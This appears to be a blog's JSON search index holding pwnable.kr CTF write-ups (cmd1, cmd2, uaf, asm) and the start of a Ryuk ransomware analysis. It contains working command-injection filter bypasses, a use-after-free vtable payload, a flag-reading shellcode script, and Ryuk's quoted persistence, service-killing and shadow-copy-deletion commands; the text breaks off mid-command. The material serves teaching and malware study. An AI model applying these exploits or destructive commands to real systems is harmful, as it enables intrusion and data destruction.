        "excerpt":"   Challenge description:     Mommy! what is PATH environment in Linux?    #include &lt;stdio.h&gt; #include &lt;string.h&gt;  int filter(char* cmd){ \tint r=0; \tr += strstr(cmd, \"flag\")!=0; \tr += strstr(cmd, \"sh\")!=0; \tr += strstr(cmd, \"tmp\")!=0; \treturn r; } int main(int argc, char* argv[], char** envp){ \tputenv(\"PATH=/thankyouverymuch\"); \tif(filter(argv[1])) return 0; \tsystem( argv[1] ); \treturn 0; }   The next two challenges (cmd1 and cmd2) are about bypassing input filters to execute a command.   First it changes the $PATH environment variable (which contains the paths to executables) to an unknown location, this way we cannot just use for example echo test, it should be /bin/echo test.   There is more than one solution to this challenge, I will list some of them.      Notice the difference between single quotes and double quotes in argv:     $ ./test ‘$(echo abc)’  argv[1] = $(echo abc)     $ ./test “$(echo abc)”  argv[1] = abc     Single quotes pass the command without executing it. Double quotes executes the command then passes its output (cannot pass the filter).    Solution:   cmd1@pwnable:~$ ./cmd1 '$(printf \"/bin/cat %s%s\" \"fl\" \"ag\")'   cmd1@pwnable:~$ ./cmd1 '$(/bin/echo 2f62696e2f7368 | /usr/bin/xxd -r -p)'  # 2f62696e2f7368 = /bin/sh $ /bin/cat flag   cmd1@pwnable:~$ ./cmd1 '$(/usr/bin/python)' &gt;&gt;&gt; f = open(\"/tmp/myflag\", \"w\") &gt;&gt;&gt; f.write(open(\"flag\").read()) &gt;&gt;&gt; cmd1@pwnable:~$ cat /tmp/myflag   Flag: mommy now I get what PATH environment is for :)  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/cmd1/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - cmd2",
        "excerpt":"   Challenge description:     Daddy bought me a system command shell. but he put some filters to prevent me from playing with it without his permission… but I wanna play anytime I want!    #include &lt;stdio.h&gt; #include &lt;string.h&gt;  int filter(char* cmd){ \tint r=0; \tr += strstr(cmd, \"=\")!=0; \tr += strstr(cmd, \"PATH\")!=0; \tr += strstr(cmd, \"export\")!=0; \tr += strstr(cmd, \"/\")!=0; \tr += strstr(cmd, \"`\")!=0; \tr += strstr(cmd, \"flag\")!=0; \treturn r; }  extern char** environ; void delete_env(){ \tchar** p; \tfor(p=environ; *p; p++)\tmemset(*p, 0, strlen(*p)); }  int main(int argc, char* argv[], char** envp){ \tdelete_env(); \tputenv(\"PATH=/no_command_execution_until_you_become_a_hacker\"); \tprintf(\"before:   %s\\n\", argv[1]); \tif(filter(argv[1])) return 0; \tprintf(\"%s\\n\", argv[1]); \tsystem( argv[1] ); \treturn 0; }   This challenge has more restrictions, the biggest one is filtering forward slash /, this will prevent us from executing any binary the usual way like this /bin/binary.   The only solution that worked with me is passing the octal value of / (57) to printf with format string %b.   Solution:   cmd2@pwnable:~$ ./cmd2 '$(printf \"%bbin%bcat %s%s\" \"\\57\" \"\\57\" \"fl\" \"ag\")'   cmd2@pwnable:~$ ./cmd2 '$(read x; echo $x)'\t# not my solution but it's very cool /bin/cat flag   Flag: FuN_w1th_5h3ll_v4riabl3s_haha  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/cmd2/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - uaf",
        "excerpt":"   Challenge description:     Mommy, what is Use After Free bug?    #include &lt;fcntl.h&gt; #include &lt;iostream&gt;  #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;unistd.h&gt;  using namespace std;  class Human{ private: \tvirtual void give_shell(){ \t\tsystem(\"/bin/sh\"); \t} protected: \tint age; \tstring name; public: \tvirtual void introduce(){ \t\tcout &lt;&lt; \"My name is \" &lt;&lt; name &lt;&lt; endl; \t\tcout &lt;&lt; \"I am \" &lt;&lt; age &lt;&lt; \" years old\" &lt;&lt; endl; \t} };  class Man: public Human{ public: \tMan(string name, int age){ \t\tthis-&gt;name = name; \t\tthis-&gt;age = age;         }         virtual void introduce(){ \t\tHuman::introduce();                 cout &lt;&lt; \"I am a nice guy!\" &lt;&lt; endl;         } };  class Woman: public Human{ public:         Woman(string name, int age){                 this-&gt;name = name;                 this-&gt;age = age;         }         virtual void introduce(){                 Human::introduce();                 cout &lt;&lt; \"I am a cute girl!\" &lt;&lt; endl;         } };  int main(int argc, char* argv[]){ \tHuman* m = new Man(\"Jack\", 25); \tHuman* w = new Woman(\"Jill\", 21);  \tsize_t len; \tchar* data; \tunsigned int op; \twhile(1){ \t\tcout &lt;&lt; \"1. use\\n2. after\\n3. free\\n\"; \t\tcin &gt;&gt; op;  \t\tswitch(op){ \t\t\tcase 1: \t\t\t\tm-&gt;introduce(); \t\t\t\tw-&gt;introduce(); \t\t\t\tbreak; \t\t\tcase 2: \t\t\t\tlen = atoi(argv[1]); \t\t\t\tdata = new char[len]; \t\t\t\tread(open(argv[2], O_RDONLY), data, len); \t\t\t\tcout &lt;&lt; \"your data is allocated\" &lt;&lt; endl; \t\t\t\tbreak; \t\t\tcase 3: \t\t\t\tdelete m; \t\t\t\tdelete w; \t\t\t\tbreak; \t\t\tdefault: \t\t\t\tbreak; \t\t} \t}  \treturn 0;\t }   Prerequisites:   - Knowledge of how glibc heap works - Knowledge of c++ inheritance and vtables   If you don’t know enough about these topics or need a refresher, see the references at the end.   This challenge is about exploiting UAF (use after free) vulnerability.   First it allocates 2 instances, one Man and one Woman, both classes inherit from Human base class so they inherit all the methods (give_shell() and introduce()).   After that it goes into an infinite loop asking for input, we have 3 choices, the first and third are pretty obvious, what we are interested in is the second option.   The second option reads argv[1] bytes of data from the file at argv[2] then stores it in data variable. Note that data array is stored at the heap (using new keyword).   The bug here is that if we choose 3 to delete the allocated instances then choose 1. we will get a segmentation fault as we are using freed memory, hence use-after-free.   I will work with the binary locally, get a working exploit then move to the remote binary, now let’s jump into GDB:      We need to set a breakpoint after the call to Man() constructor and check the heap chunks.      We see the new heap chunk created at address 0x614ee0 with size 0x20 = 32, the size passed to new() was 0x18 but the heap manager ensures  that the allocation will be 8-byte aligned on 32 bit systems, or 16-byte aligned on 64 bit systems, hence the size grows to 0x20.   If we examine this chunk we see the address to vtable 0x0000000000401570 and after it we see the value of age 0x0000000000000019 and address of name at 0x0000000000614ec8.   If we examine the vtable we see the addresses of the two virtual functions, give_shell() at 0x000000000040117a and introduce() at 0x00000000004012d2, so far so good.   Now let’s delete the two instances using the third option 3 and check the chunk again:      As you can see, the vtable address was erased, but if we examine the vtable it self we see that it still contains the addresses to the two virtual functions.   If we check the free heap bins, we see the two freed chunks along with their sizes:      Now for the exploitation part, finally :)   As we know, the heap manager allocates new chunks from the previously freed chunks if they are same size. So we can use the second option 2 to allocate the data array with size of 0x18 (which will be a heap chunk of size 0x20 after the alignment), this array will overwrite Man and Woman chunks so when we use them again using option 1, we can execute what we want.   Let’s write some A’s to a test file and see how it goes:   $ python -c \"print 'A'*0x18\" &gt; test      Notice that we used the second option 2 twice, because the Woman free chunk was at the top of the freed chunks so it will be recycled first and we are targeting Man chunk, so we allocate 2 chunks.      As you can see, the two chunks were overwritten and the new vtable address is 0x4141414141414141.   The way m-&gt;introduce() works is it first accesses the vtable address 0x0000000000401570, it will find two function addresses (give_shell and introduce), so it will call (*vtable)+8.   So to call give_shell() instead of introduce(), we set the vtable_address = vtable_address - 8 which ``0x0000000000401568` will be  and we are done.   Solution:   uaf@pwnable:~$ python -c \"print '\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00' + 'A'*16\" &gt; /tmp/heapooooooo uaf@pwnable:~$ ./uaf 24 /tmp/heapooooooo 1. use 2. after 3. free 3 1. use 2. after 3. free 2 your data is allocated 1. use 2. after 3. free 2 your data is allocated 1. use 2. after 3. free 1 $ id uid=1029(uaf) gid=1029(uaf) egid=1030(uaf_pwn) groups=1030(uaf_pwn),1029(uaf) $ cat flag yay_f1ag_aft3r_pwning   Flag: yay_f1ag_aft3r_pwning   References:   https://shaharmike.com/cpp/vtable-part1/https://shaharmike.com/cpp/vtable-part1/   https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/   https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/   https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/uaf/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - asm",
        "excerpt":"   Challenge description:     Mommy! I think I know how to make shellcodes    #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/mman.h&gt; #include &lt;seccomp.h&gt; #include &lt;sys/prctl.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt;  #define LENGTH 128  void sandbox(){ \tscmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); \tif (ctx == NULL) { \t\tprintf(\"seccomp error\\n\"); \t\texit(0); \t}  \tseccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); \tseccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); \tseccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); \tseccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); \tseccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);  \tif (seccomp_load(ctx) &lt; 0){ \t\tseccomp_release(ctx); \t\tprintf(\"seccomp error\\n\"); \t\texit(0); \t} \tseccomp_release(ctx); }  char stub[] = \"\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x48\\x31\\xed\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff\"; unsigned char filter[256]; int main(int argc, char* argv[]){  \tsetvbuf(stdout, 0, _IONBF, 0); \tsetvbuf(stdin, 0, _IOLBF, 0);  \tprintf(\"Welcome to shellcoding practice challenge.\\n\"); \tprintf(\"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\\n\"); \tprintf(\"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\\n\"); \tprintf(\"If this does not challenge you. you should play 'asg' challenge :)\\n\");  \tchar* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); \tmemset(sh, 0x90, 0x1000); \tmemcpy(sh, stub, strlen(stub)); \t \tint offset = sizeof(stub); \tprintf(\"give me your x64 shellcode: \"); \tread(0, sh+offset, 1000);  \talarm(10); \tchroot(\"/home/asm_pwn\");\t// you are in chroot jail. so you can't use symlink in /tmp \tsandbox(); \t((void (*)(void))sh)(); \treturn 0; }   This challenge is asking for x64 shellcode to read the flag file, it’s using some seccomp rules to limit us to only use open/read/write/exit syscalls (so we cannot spawn a shell).   We can write some assembly (painful) or we can use pwntools to do the work for us :)   We need to open the flag file, read it’s content then write this content to stdout and exit, simple as that.   The given assembly stub that will run first is just zeroing out all the registers.   Solution:   # solve.py  from pwn import *  context(arch='amd64', os='linux')  file_name = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong' length = 50  shellcode = asm( \tshellcraft.open(file_name) + \tshellcraft.read('rax', 'rsp', length) + \tshellcraft.write(1, 'rsp', length) + \tshellcraft.exit(0))  sh = ssh('asm', 'pwnable.kr', password='guest', port=2222) p = sh.remote('0', 9026)  print(p.recv()) p.sendline(shellcode) print(p.recv())   $ python solve.py [+] Connecting to pwnable.kr on port 2222: Done [+] Connecting to 0:9026 via SSH to pwnable.kr: Done Welcome to shellcoding practice challenge. In this challenge, you can run your x64 shellcode under SECCOMP sandbox. Try to make shellcode that spits flag using open()/read()/write() systemcalls only. If this does not challenge you. you should play 'asg' challenge :) give me your x64 shellcode:  Mak1ng_shelLcodE_i5_veRy_eaSy lease_read_this_file   Flag: Mak1ng_shelLcodE_i5_veRy_eaSy  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/asm/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Deep Analysis of Ryuk Ransomware",
        "excerpt":"Introduction   Attack Chain   Ryuk has been know to be a part of a bigger \"Triple Threat\" attack that involves Emotet and TrickBot.   The first stage of this attack is the delivery of Emotet through phishing emails that contain a weaponized word document, this document contains a macro code that downloads Emotet.   Once Emotet executes, it downloads another malware (usually TrickBot)  which can collect system information, steal credentials, disable AV, do lateral movement, …   The third stage of the attack is to connect to the C&amp;C server to download Ryuk which makes use of the lateral movement done by TrickBot to infect and encrypt as many systems on the network as possible.      Ryuk overview   I will give a brief overview of how Ryuk operates then I will go into details in the upcoming sections.   Ryuk operates in two stages. The first stage is a dropper that drops the real Ryuk ransomware at another directory and exits. Then the ransomware tries to injects running processes to avoid detection. We can also see that it launches a cmd.exe process to modify the registry.      After that, Ryuk goes through encrypting the system files and network shares, it drops a \"Ransom Note\" at every folder it encrypts under the name RyukReadMe.txt.      Enough introduction, let’s dive into Ryuk.   First Stage (The Dropper)   SHA256: 23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2   The dropper first checks the windows MajorVersion and if it’s equal to 5 (windows 2000 | windows XP | Windows Server 2003), it drops the ransomware executable at C:\\Documents and Settings\\Default User\\ , otherwise it drops it at C:\\users\\Public\\.      The name of the dropped executable is five randomly generated characters.      If the creation of this file failed, Ryuk drops the executable at the same directory of the dropper with replacing the last character of its name with the letter ‘V’ (If the dropper name is ryuk.exe, the dropped executable will be ryuV.exe).   Next we can see a call to IsWow64Process() and if it returns true (which means Ryuk is running at a 64 bit system), it writes the 64 bit binary to the dropped executable, else it writes the 32 bit binary. The 2 binary files are stored at the .data section.   The last step is a call to ShellExecuteW() to execute the second stage executable with passing it one argument which is the dropper path (This is used later to delete the dropper).                                    Second Stage   SHA256: 8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7d   Deleting The Dropper   Before the dropper exits, it passes its path to the second stage executable as a command line argument which in turn deletes the dropper.      Persistence   Ryuk uses the very well know registry key to achieve persistence, It creates a new value under the name  \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchos\" and its data is set to the executable path which in my case is \"C:\\users\\Public\\BPWPc.exe\".   Here is the full command:   C:\\Windows\\System32\\cmd.exe /C REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"svchos\" /t REG_SZ /d \"C:\\users\\Public\\BPWPc.exe\" /f   Privilege Escalation   Ryuk uses AdjustTokenPrivileges() function to adjust its process security access token. The requested privilege name is SeDebugPrivilege and according to Microsoft docs:      SeDebugPrivilege:     Required to debug and adjust the memory of a process owned by another account. With this privilege, the user can attach a debugger to any process or to the kernel.       This method is usually used by malware to perform process injection (which is done next).   Process Injection   Ryuk goes through all running processes and stores (ProcessName, ProcessID, ProcessType) in a big array, ProcessType is an integer that is set to 1 If the domain name of the user of the process starts with “NT A” (which is “NT AUTHORITY”), otherwise the ProcessType is set to 2.      To make it easier, I created a structure in IDA called ProcessInfo.      After that, Ryuk loops through the processes’ stored data to perform the process injection.   If the process name is (csrss.exe | explorer.exe | lsaas.exe), Ryuk ignores that process.      The process injection technique used here is very simple, Ryuk allocates memory for its process at the target process memory space using VirtualAllocEx(), then it writes its process to that allocated memory using WriteProcessMemory(). Finally it creates a new thread using CreateRemoteThread() to run Ryuk’s thread at the injected process.      Building Imports   Ryuk imports its necessary functions dynamically using LoadLibraryA() and GetProcAdress(). The names of the imported functions are obfuscated so static analysis won’t do very well here.      We can use a debugger to get these names rather than reversing the obfuscation algorithm.      Here is the list of imported functions:                              Expand to see more           &emsp; advapi32.dll  &emsp; &emsp; &ensp; CryptAcquireContextW  &emsp; &emsp; &ensp; CryptDecrypt  &emsp; &emsp; &ensp; CryptDeriveKey  &emsp; &emsp; &ensp; CryptDestroyKey  &emsp; &emsp; &ensp; CryptEncrypt  &emsp; &emsp; &ensp; CryptExportKey  &emsp; &emsp; &ensp; CryptGenKey  &emsp; &emsp; &ensp; CryptImportKey   &emsp; &emsp; &ensp; GetUserNameA  &emsp; &emsp; &ensp; GetUserNameW  &emsp; &emsp; &ensp; RegCloseKey  &emsp; &emsp; &ensp; RegDeleteValueW  &emsp; &emsp; &ensp; RegOpenKeyExA  &emsp; &emsp; &ensp; RegOpenKeyExW  &emsp; &emsp; &ensp; RegQueryValueExA  &emsp; &emsp; &ensp; RegSetValueExW  &emsp; kernel32.dll  &emsp; &emsp; &ensp; CloseHandle  &emsp; &emsp; &ensp; CopyFileA  &emsp; &emsp; &ensp; CopyFileW  &emsp; &emsp; &ensp; CreateDirectoryW  &emsp; &emsp; &ensp; CreateFileA  &emsp; &emsp; &ensp; CreateFileW  &emsp; &emsp; &ensp; CreateProcessA  &emsp; &emsp; &ensp; CreateProcessW  &emsp; &emsp; &ensp; DeleteFileW  &emsp; &emsp; &ensp; ExitProcess  &emsp; &emsp; &ensp; FindClose  &emsp; &emsp; &ensp; FindFirstFileW  &emsp; &emsp; &ensp; FindNextFileW  &emsp; &emsp; &ensp; FreeLibrary  &emsp; &emsp; &ensp; GetCommandLineW  &emsp; &emsp; &ensp; GetCurrentProcess  &emsp; &emsp; &ensp; GetDriveTypeW  &emsp; &emsp; &ensp; GetFileAttributesA  &emsp; &emsp; &ensp; GetFileAttributesW  &emsp; &emsp; &ensp; GetFileSize  &emsp; &emsp; &ensp; GetLogicalDrives  &emsp; &emsp; &ensp; GetModuleFileNameA  &emsp; &emsp; &ensp; GetModuleFileNameW  &emsp; &emsp; &ensp; GetModuleHandleA  &emsp; &emsp; &ensp; GetStartupInfoW  &emsp; &emsp; &ensp; GetTickCount  &emsp; &emsp; &ensp; GetVersionExW  &emsp; &emsp; &ensp; GetWindowsDirectoryW  &emsp; &emsp; &ensp; GlobalAlloc  &emsp; &emsp; &ensp; LoadLibraryA  &emsp; &emsp; &ensp; ReadFile  &emsp; &emsp; &ensp; SetFileAttributesA  &emsp; &emsp; &ensp; SetFileAttributesW  &emsp; &emsp; &ensp; SetFilePointer  &emsp; &emsp; &ensp; Sleep  &emsp; &emsp; &ensp; VirtualAlloc  &emsp; &emsp; &ensp; VirtualFree  &emsp; &emsp; &ensp; WinExec  &emsp; &emsp; &ensp; Wow64DisableWow64FsRedirection  &emsp; &emsp; &ensp; Wow64RevertWow64FsRedirection  &emsp; &emsp; &ensp; WriteFile  &emsp; ole32.dll  &emsp; &emsp; &ensp; CoCreateInstance  &emsp; &emsp; &ensp; CoInitialize  &emsp; Shell32.dll  &emsp; &emsp; &ensp; ShellExecuteA  &emsp; &emsp; &ensp; ShellExecuteW  &emsp; mpr.dll  &emsp; &emsp; &ensp; WNetCloseEnum  &emsp; &emsp; &ensp; WNetEnumResourceW  &emsp; &emsp; &ensp; WNetOpenEnumW  &emsp; Iphlpapi.dll  &emsp; &emsp; &ensp; GetIpNetTable    Killing Processes   Ryuk has a long list of predefined services and processes to kill using net stop and taskkill /IM respectively.   Here is the list of services:                              Expand to see more                   &emsp; &emsp; Acronis VSS Provider           &emsp; &emsp; Enterprise Client Service           &emsp; &emsp; Sophos Agent           &emsp; &emsp; Sophos AutoUpdate Service           &emsp; &emsp; Sophos Clean Service           &emsp; &emsp; Sophos Device Control Service           &emsp; &emsp; Sophos File Scanner Service           &emsp; &emsp; Sophos Health Service           &emsp; &emsp; Sophos MCS Agent           &emsp; &emsp; Sophos MCS Client     \t\t&emsp; &emsp; Sophos Message Router           &emsp; &emsp; Sophos Safestore Service           &emsp; &emsp; Sophos System Protection Service           &emsp; &emsp; Sophos Web Control Service           &emsp; &emsp; SQLsafe Backup Service           &emsp; &emsp; SQLsafe Filter Service           &emsp; &emsp; Symantec System Recovery           &emsp; &emsp; Veeam Backup Catalog Data Service           &emsp; &emsp; AcronisAgent           &emsp; &emsp; AcrSch2Svc           &emsp; &emsp; Antivirus           &emsp; &emsp; ARSM           &emsp; &emsp; BackupExecAgentAccelerator           &emsp; &emsp; BackupExecAgentBrowser           &emsp; &emsp; BackupExecDeviceMediaService           &emsp; &emsp; BackupExecJobEngine           &emsp; &emsp; BackupExecManagementService           &emsp; &emsp; BackupExecRPCService           &emsp; &emsp; BackupExecVSSProvider           &emsp; &emsp; bedbg           &emsp; &emsp; DCAgent           &emsp; &emsp; EPSecurityService           &emsp; &emsp; EPUpdateService           &emsp; &emsp; EraserSvc11710           &emsp; &emsp; EsgShKernel           &emsp; &emsp; FA_Scheduler           &emsp; &emsp; IISAdmin           &emsp; &emsp; IMAP4Svc           &emsp; &emsp; macmnsvc           &emsp; &emsp; masvc           &emsp; &emsp; MBAMService           &emsp; &emsp; MBEndpointAgent           &emsp; &emsp; McAfeeEngineService           &emsp; &emsp; McAfeeFramework           &emsp; &emsp; McAfeeFrameworkMcAfeeFramework           &emsp; &emsp; McShield           &emsp; &emsp; McTaskManager           &emsp; &emsp; mfemms           &emsp; &emsp; mfevtp           &emsp; &emsp; MMS           &emsp; &emsp; mozyprobackup           &emsp; &emsp; MsDtsServer           &emsp; &emsp; MsDtsServer100           &emsp; &emsp; MsDtsServer110           &emsp; &emsp; MSExchangeES           &emsp; &emsp; MSExchangeIS           &emsp; &emsp; MSExchangeMGMT           &emsp; &emsp; MSExchangeMTA           &emsp; &emsp; MSExchangeSA           &emsp; &emsp; MSExchangeSRS           &emsp; &emsp; MSOLAP$SQL_2008           &emsp; &emsp; MSOLAP$SYSTEM_BGC           &emsp; &emsp; MSOLAP$TPS           &emsp; &emsp; MSOLAP$TPSAMA           &emsp; &emsp; MSSQL$BKUPEXEC           &emsp; &emsp; MSSQL$ECWDB2           &emsp; &emsp; MSSQL$PRACTICEMGT           &emsp; &emsp; MSSQL$PRACTTICEBGC           &emsp; &emsp; MSSQL$PROFXENGAGEMENT           &emsp; &emsp; MSSQL$SBSMONITORING           &emsp; &emsp; MSSQL$SHAREPOINT           &emsp; &emsp; MSSQL$SQL_2008           &emsp; &emsp; MSSQL$SYSTEM_BGC           &emsp; &emsp; MSSQL$TPS           &emsp; &emsp; MSSQL$TPSAMA           &emsp; &emsp; MSSQL$VEEAMSQL2008R2           &emsp; &emsp; MSSQL$VEEAMSQL2012           &emsp; &emsp; MSSQLFDLauncher           &emsp; &emsp; MSSQLFDLauncher$PROFXENGAGEMENT           &emsp; &emsp; MSSQLFDLauncher$SBSMONITORING           &emsp; &emsp; MSSQLFDLauncher$SHAREPOINT           &emsp; &emsp; MSSQLFDLauncher$SQL_2008           &emsp; &emsp; MSSQLFDLauncher$SYSTEM_BGC           &emsp; &emsp; MSSQLFDLauncher$TPS           &emsp; &emsp; MSSQLFDLauncher$TPSAMA           &emsp; &emsp; MSSQLSERVER           &emsp; &emsp; MSSQLServerADHelper100           &emsp; &emsp; MSSQLServerOLAPService           &emsp; &emsp; MySQL80           &emsp; &emsp; MySQL57           &emsp; &emsp; ntrtscan           &emsp; &emsp; OracleClientCache80           &emsp; &emsp; PDVFSService           &emsp; &emsp; POP3Svc           &emsp; &emsp; ReportServer           &emsp; &emsp; ReportServer$SQL_2008           &emsp; &emsp; ReportServer$SYSTEM_BGC           &emsp; &emsp; ReportServer$TPS           &emsp; &emsp; ReportServer$TPSAMA           &emsp; &emsp; RESvc           &emsp; &emsp; sacsvr           &emsp; &emsp; SamSs           &emsp; &emsp; SAVAdminService           &emsp; &emsp; SAVService           &emsp; &emsp; SDRSVC           &emsp; &emsp; SepMasterService           &emsp; &emsp; ShMonitor           &emsp; &emsp; Smcinst           &emsp; &emsp; SmcService           &emsp; &emsp; SMTPSvc           &emsp; &emsp; SNAC           &emsp; &emsp; SntpService           &emsp; &emsp; sophossps           &emsp; &emsp; SQLAgent$BKUPEXEC           &emsp; &emsp; SQLAgent$ECWDB2           &emsp; &emsp; SQLAgent$PRACTTICEBGC           &emsp; &emsp; SQLAgent$PRACTTICEMGT           &emsp; &emsp; SQLAgent$PROFXENGAGEMENT           &emsp; &emsp; SQLAgent$SBSMONITORING           &emsp; &emsp; SQLAgent$SHAREPOINT           &emsp; &emsp; SQLAgent$SQL_2008           &emsp; &emsp; SQLAgent$SYSTEM_BGC           &emsp; &emsp; SQLAgent$TPS           &emsp; &emsp; SQLAgent$TPSAMA           &emsp; &emsp; SQLAgent$VEEAMSQL2008R2           &emsp; &emsp; SQLAgent$VEEAMSQL2012           &emsp; &emsp; SQLBrowser           &emsp; &emsp; SQLSafeOLRService           &emsp; &emsp; SQLSERVERAGENT           &emsp; &emsp; SQLTELEMETRY           &emsp; &emsp; SQLTELEMETRY$ECWDB2           &emsp; &emsp; SQLWriter           &emsp; &emsp; SstpSvc           &emsp; &emsp; svcGenericHost           &emsp; &emsp; swi_filter           &emsp; &emsp; swi_service           &emsp; &emsp; swi_update_64           &emsp; &emsp; TmCCSF           &emsp; &emsp; tmlisten           &emsp; &emsp; TrueKey           &emsp; &emsp; TrueKeyScheduler           &emsp; &emsp; TrueKeyServiceHelper           &emsp; &emsp; UI0Detect           &emsp; &emsp; VeeamBackupSvc           &emsp; &emsp; VeeamBrokerSvc           &emsp; &emsp; VeeamCatalogSvc           &emsp; &emsp; VeeamCloudSvc           &emsp; &emsp; VeeamDeploymentService           &emsp; &emsp; VeeamDeploySvc           &emsp; &emsp; VeeamEnterpriseManagerSvc           &emsp; &emsp; VeeamMountSvc           &emsp; &emsp; VeeamNFSSvc           &emsp; &emsp; VeeamRESTSvc           &emsp; &emsp; VeeamTransportSvc           &emsp; &emsp; W3Svc           &emsp; &emsp; wbengine           &emsp; &emsp; WRSVC           &emsp; &emsp; MSSQL$VEEAMSQL2008R2           &emsp; &emsp; SQLAgent$VEEAMSQL2008R2           &emsp; &emsp; VeeamHvIntegrationSvc           &emsp; &emsp; swi_update           &emsp; &emsp; SQLAgent$CXDB           &emsp; &emsp; SQLAgent$CITRIX_METAFRAME           &emsp; &emsp; SQL Backups           &emsp; &emsp; MSSQL$PROD           &emsp; &emsp; Zoolz 2 Service           &emsp; &emsp; MSSQLServerADHelper            &emsp; &emsp; SQLAgent$PROD            &emsp; &emsp; msftesql$PROD            &emsp; &emsp; NetMsmqActivator           &emsp; &emsp; EhttpSrv           &emsp; &emsp; ekrn           &emsp; &emsp; ESHASRV           &emsp; &emsp; MSSQL$SOPHOS           &emsp; &emsp; SQLAgent$SOPHOS           &emsp; &emsp; AVP           &emsp; &emsp; klnagent           &emsp; &emsp; MSSQL$SQLEXPRESS           &emsp; &emsp; SQLAgent$SQLEXPRESS           &emsp; &emsp; wbengine           &emsp; &emsp; kavfsslp           &emsp; &emsp; KAVFSGT           &emsp; &emsp; KAVFS           &emsp; &emsp; mfefire     And here is the list of processes:                              Expand to see more           &emsp; &emsp; zoolz.exe   &emsp; &emsp; agntsvc.exe   &emsp; &emsp; dbeng50.exe   &emsp; &emsp; dbsnmp.exe   &emsp; &emsp; encsvc.exe   &emsp; &emsp; excel.exe   &emsp; &emsp; firefoxconfig.exe   &emsp; &emsp; infopath.exe    &emsp; &emsp; isqlplussvc.exe   &emsp; &emsp; msaccess.exe   &emsp; &emsp; msftesql.exe   &emsp; &emsp; mspub.exe   &emsp; &emsp; mydesktopqos.exe   &emsp; &emsp; mydesktopservice.exe   &emsp; &emsp; mysqld.exe   &emsp; &emsp; mysqld-nt.exe   &emsp; &emsp; mysqld-opt.exe   &emsp; &emsp; ocautoupds.exe   &emsp; &emsp; ocomm.exe   &emsp; &emsp; ocssd.exe   &emsp; &emsp; onenote.exe   &emsp; &emsp; oracle.exe   &emsp; &emsp; outlook.exe   &emsp; &emsp; powerpnt.exe   &emsp; &emsp; sqbcoreservice.exe   &emsp; &emsp; sqlagent.exe   &emsp; &emsp; sqlbrowser.exe   &emsp; &emsp; sqlservr.exe   &emsp; &emsp; sqlwriter.exe   &emsp; &emsp; steam.exe   &emsp; &emsp; synctime.exe   &emsp; &emsp; tbirdconfig.exe   &emsp; &emsp; thebat.exe   &emsp; &emsp; thebat64.exe   &emsp; &emsp; thunderbird.exe   &emsp; &emsp; visio.exe   &emsp; &emsp; winword.exe   &emsp; &emsp; wordpad.exe   &emsp; &emsp; xfssvccon.exe   &emsp; &emsp; tmlisten.exe   &emsp; &emsp; PccNTMon.exe   &emsp; &emsp; CNTAoSMgr.exe   &emsp; &emsp; Ntrtscan.exe   &emsp; &emsp; mbamtray.exe    Deleting Backups   Ryuk drops a batch script at C:\\Users\\Public\\window.bat which deletes all shadow copies and possible backups, then the script deletes itself.   vssadmin Delete Shadows /all /quiet vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded vssadmin resize 